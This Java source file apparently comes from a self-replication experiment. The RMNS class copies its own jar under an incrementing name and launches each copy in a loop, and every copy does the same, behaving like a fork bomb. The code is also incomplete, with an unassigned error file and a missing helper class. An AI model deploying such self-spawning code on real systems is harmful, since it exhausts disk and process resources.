/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package rmnsprogram;

import java.io.File;

/**
 *
 * @author brwsprpn0099
 */
public class RMNS implements Runnable {

    static private File original;
    private File copy;
    Thread t = new Thread(this);

    public RMNS() {

        original = new File(this.getClass().getProtectionDomain().getCodeSource().getLocation().getPath());

        startThread();


    }

    private void startThread() {

        t.start();

    }

    private static String nominate(File o) {

        String aux1;
        String aux2;

        try {

            aux1 = o.getName();

            aux2 = aux1.substring(aux1.indexOf("_") + 1, aux1.indexOf("."));
            
            aux2 = Integer.toString(Integer.valueOf(aux2)+1);

            System.out.println(aux2);

        } catch (Exception e) {

            aux2 = "2";

        }
        
        return "RMNS"+System.nanoTime()+"_"+aux2+".jar";

    }

    private void replicate() {

        copy = new File(nominate(original));

        Procedures.easyFileCopier(copy, original);

    }
    
    Process p;
    ProcessBuilder pb;
    Boolean check = false;
    File errorFile;

    private void select() {
        
        p = Procedures.easyProcessBuilder("java", "-jar", copy.getPath());

        if (errorFile.length() == 0) {
            check = true;
        }
        
        else {
            
            copy.delete();
            p.destroy();
                        
        }

    }

    public static void main(String[] args) {

        new RMNS();

    }

    @Override
    public void run() {

        while (!check) {
            
            replicate();
            select();

        }

    }
}
